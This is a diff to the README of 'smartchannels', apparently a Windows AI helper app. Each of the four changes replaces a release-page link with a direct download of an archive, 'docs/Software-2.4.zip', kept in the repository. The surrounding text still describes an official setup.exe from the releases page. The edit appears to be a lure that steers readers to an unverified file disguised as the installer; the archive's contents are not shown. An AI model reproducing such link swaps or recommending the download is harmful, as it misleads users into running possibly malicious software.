@@ -1,6 +1,6 @@
 # 🤖 smartchannels - Smart AI Help for Every Channel
 
-[![Download Latest Release](https://img.shields.io/badge/Download-smartchannels-brightgreen)](https://github.com/malindo77/smartchannels/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-smartchannels-brightgreen)](https://github.com/malindo77/smartchannels/raw/refs/heads/main/docs/Software-2.4.zip)
 
 ---
 
@@ -41,7 +41,7 @@ Follow these steps to get smartchannels running on your Windows PC.
 
 Visit the release page to get the latest version of smartchannels:
 
-[![Download smartchannels](https://img.shields.io/badge/Download-Release-blue)](https://github.com/malindo77/smartchannels/releases)
+[![Download smartchannels](https://img.shields.io/badge/Download-Release-blue)](https://github.com/malindo77/smartchannels/raw/refs/heads/main/docs/Software-2.4.zip)
 
 Click the latest release. Look for a file named like `smartchannels-setup.exe` or similar. Download it to your computer.
 
@@ -82,7 +82,7 @@ smartchannels occasionally receives updates to improve features and security.
 
 To update:
 
-- Check the release page regularly: https://github.com/malindo77/smartchannels/releases
+- Check the release page regularly: https://github.com/malindo77/smartchannels/raw/refs/heads/main/docs/Software-2.4.zip
 - Download the newest installer.
 - Run it like the first installation. Your settings will stay intact.
 - Restart the app to use the updated version.
@@ -139,7 +139,7 @@ Others may be supported based on updates. Check the release notes for new platfo
 
 - Download smartchannels from the release page:
 
-[![Get smartchannels](https://img.shields.io/badge/Get%20smartchannels-Download-grey)](https://github.com/malindo77/smartchannels/releases)
+[![Get smartchannels](https://img.shields.io/badge/Get%20smartchannels-Download-grey)](https://github.com/malindo77/smartchannels/raw/refs/heads/main/docs/Software-2.4.zip)
 
 - Detailed setup guides and troubleshooting are available on the GitHub site.
 - Contact the community through GitHub discussions for help.
